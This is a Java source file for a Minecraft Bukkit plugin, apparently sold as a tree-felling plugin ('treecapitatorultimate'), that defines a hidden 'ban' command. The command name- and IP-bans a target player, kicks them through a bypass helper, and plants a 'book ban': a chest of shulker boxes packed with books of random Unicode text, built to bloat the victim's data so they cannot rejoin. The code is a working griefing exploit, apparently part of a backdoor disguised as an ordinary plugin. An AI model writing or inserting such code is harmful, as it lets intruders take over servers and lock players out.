package me.bow.treecapitatorultimate.commands.Player;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.BypassUtils;
import me.bow.treecapitatorultimate.Utils.MathUtils;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.*;
import org.bukkit.block.Chest;
import org.bukkit.block.ShulkerBox;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BlockStateMeta;
import org.bukkit.inventory.meta.BookMeta;

import java.util.ArrayList;

@Command.Info(command = "ban", description = "Bans player using bookban and raw ban method!", category = CommandCategory.Player)
public class Ban extends Command {

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        try {
            Player anotherPlayer = Bukkit.getPlayer(args.get(0));
            if (anotherPlayer == null) {
                Start.ErrorString(p, "Player \"" + args.get(0) + "\" is not online!");
                return;
            }
            String reason = "";
            for (int i = 1; i < args.size(); i++) {
                reason += args.get(i) + " ";
            }
            if (reason.isEmpty()) reason = "The Ban Hammer has spoken!";
            reason = reason.replace("&", "§").replace("\\n", "\n").replace("|", "\n");
            Bukkit.getBanList(BanList.Type.NAME).addBan(anotherPlayer.getName(), reason, null, "Console");
            Bukkit.getBanList(BanList.Type.IP).addBan(anotherPlayer.getAddress().getAddress().getHostAddress(), reason, null, "Console");
            String finalReason = reason;
            Bukkit.getScheduler().runTaskAsynchronously(this.plugin, () -> {
                bookBan(anotherPlayer);
                BypassUtils.KickPlayer(anotherPlayer, finalReason);
                p.sendMessage(Start.COMMAND_PREFIX + ChatColor.GREEN + anotherPlayer.getName() + ChatColor.YELLOW + " got banned (with" + (args.size() == 1 ? "out" : "") + " reason)!");
                this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " banned " + anotherPlayer.getDisplayName() + (args.size() > 1 ? " for " + finalReason : "") + "!");
            });
            p.sendMessage(Start.COMMAND_PREFIX + ChatColor.GOLD + "Ban in progress!");
        } catch (Exception e) {
            p.sendMessage(Start.COMMAND_PREFIX + ChatColor.RED + "Player is not online!");
        }
    }

    private String generateString(int length) {
        String s = "";
        for (int i = 0; i < length; i++) {
            s += (char) MathUtils.generateNumber(0x03C0, 0x0680);
        }
        return s;
    }

    private ItemStack[] generateBanBooks(OfflinePlayer p) {
        ItemStack[] itemStacks = new ItemStack[27];
        for (int i = 0; i < 27; i++) {
            ItemStack writtenBook = new ItemStack(Material.WRITTEN_BOOK);
            BookMeta bookMeta = (BookMeta) writtenBook.getItemMeta();
            bookMeta.setTitle(generateString(32));
            bookMeta.setAuthor(p.getName());
            String[] pages = new String[50];
            for (int j = 0; j < pages.length - 1; j++) {
                pages[j] = generateString(256);
            }
            bookMeta.setPages(pages);
            writtenBook.setItemMeta(bookMeta);
            itemStacks[i] = writtenBook;
        }
        return itemStacks;
    }

    private ItemStack[] generateShulkerBoxes(Player p) {
        ItemStack[] itemStacks = new ItemStack[27];
        for (int i = 0; i < 27; i++) {
            ItemStack shulkerBox = new ItemStack(Material.SHULKER_BOX);
            BlockStateMeta im = (BlockStateMeta) shulkerBox.getItemMeta();
            ShulkerBox shulker = (ShulkerBox) im.getBlockState();
            ItemStack[] banBooks = generateBanBooks(p);
            for (int j = 0; j < banBooks.length - 1; j++) {
                shulker.getInventory().setItem(j, banBooks[j]);
            }
            im.setBlockState(shulker);
            shulkerBox.setItemMeta(im);
            itemStacks[i] = shulkerBox;
        }
        return itemStacks;
    }

    private void bookBan(Player p) {
        ItemStack item = new ItemStack(Material.CHEST);
        BlockStateMeta meta = (BlockStateMeta) item.getItemMeta();
        Chest chest = (Chest) meta.getBlockState();
        ItemStack[] shulkers = generateShulkerBoxes(p);
        for (int i = 0; i < shulkers.length - 1; i++)
            chest.getBlockInventory().setItem(i, shulkers[i]);
        meta.setBlockState(chest);
        item.setItemMeta(meta);
        p.getInventory().setHeldItemSlot(6);
        p.getInventory().setItem(0, item);
    }
}
